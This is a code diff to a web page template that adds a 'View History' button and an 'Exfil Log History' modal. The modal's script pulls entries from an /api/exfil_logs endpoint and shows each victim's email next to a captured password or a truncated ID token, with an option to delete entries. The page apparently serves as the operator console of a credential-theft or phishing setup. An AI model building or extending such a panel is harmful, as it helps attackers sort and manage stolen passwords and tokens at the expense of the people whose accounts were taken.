@@ -34,6 +34,7 @@
             <main class="profile-details-panel">
                 <div class="panel-header">
                     <h2>User Details</h2>
+                    <button id="historyBtn" class="history-button">View History</button>
                 </div>
                 <div id="userDetails" class="profile-details-content">
                     <div class="welcome-message">
@@ -49,7 +50,104 @@
         </footer>
     </div>
 
+    <!-- Exfil History Modal -->
+    <div id="historyModal" class="modal-overlay" hidden>
+        <div class="modal-box">
+            <div class="modal-header">
+                <h3>Exfil Log History</h3>
+                <button id="historyModalClose" class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <table id="historyTable" class="history-table">
+                    <thead>
+                        <tr>
+                            <th>Received At</th>
+                            <th>Email</th>
+                            <th>Type</th>
+                            <th>Value</th>
+                            <th></th>
+                        </tr>
+                    </thead>
+                    <tbody id="historyTableBody"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
     <script src="{{ url_for('static', filename='js/shared.js') }}"></script>
     <script src="{{ url_for('static', filename='js/clients.js') }}"></script>
+    <script>
+        (function () {
+            const modal = document.getElementById('historyModal');
+            const tbody = document.getElementById('historyTableBody');
+
+            async function loadLogs() {
+                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center">Loading…</td></tr>';
+                try {
+                    const res = await fetch('/api/exfil_logs');
+                    const data = await res.json();
+                    tbody.innerHTML = '';
+                    if (!data.logs.length) {
+                        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center">No entries</td></tr>';
+                        return;
+                    }
+                    for (const entry of data.logs) {
+                        const p = entry.payload || {};
+                        const type = p.idToken ? 'id_token' : (p.label ? 'password' : 'other');
+                        const value = p.idToken
+                            ? (p.idToken.substring(0, 40) + '…')
+                            : (p.label || JSON.stringify(p));
+                        const tr = document.createElement('tr');
+                        const receivedAt = entry.received_at || '';
+                        tr.innerHTML = `
+                            <td>${receivedAt}</td>
+                            <td>${p.email || ''}</td>
+                            <td><span class="log-type log-type--${type}">${type}</span></td>
+                            <td class="log-value">${value}</td>
+                            <td><button class="log-delete-btn" data-received-at="${receivedAt}">Delete</button></td>`;
+                        tbody.appendChild(tr);
+                    }
+                } catch (err) {
+                    tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;color:var(--danger-color)">Error: ${err.message}</td></tr>`;
+                }
+            }
+
+            document.getElementById('historyBtn').addEventListener('click', () => {
+                modal.hidden = false;
+                loadLogs();
+            });
+
+            tbody.addEventListener('click', async e => {
+                const btn = e.target.closest('.log-delete-btn');
+                if (!btn) return;
+                const receivedAt = btn.dataset.receivedAt;
+                if (!confirm('Delete this log entry?')) return;
+                btn.disabled = true;
+                try {
+                    const res = await fetch('/api/exfil_logs', {
+                        method: 'DELETE',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({received_at: receivedAt})
+                    });
+                    if (res.ok) {
+                        btn.closest('tr').remove();
+                        if (!tbody.querySelector('tr')) {
+                            tbody.innerHTML = '<tr><td colspan="5" style="text-align:center">No entries</td></tr>';
+                        }
+                    } else {
+                        const err = await res.json();
+                        alert('Delete failed: ' + (err.error || res.status));
+                        btn.disabled = false;
+                    }
+                } catch (err) {
+                    alert('Delete failed: ' + err.message);
+                    btn.disabled = false;
+                }
+            });
+
+            document.getElementById('historyModalClose').addEventListener('click', () => { modal.hidden = true; });
+            modal.addEventListener('click', e => { if (e.target === modal) modal.hidden = true; });
+        })();
+    </script>
 </body>
 </html>
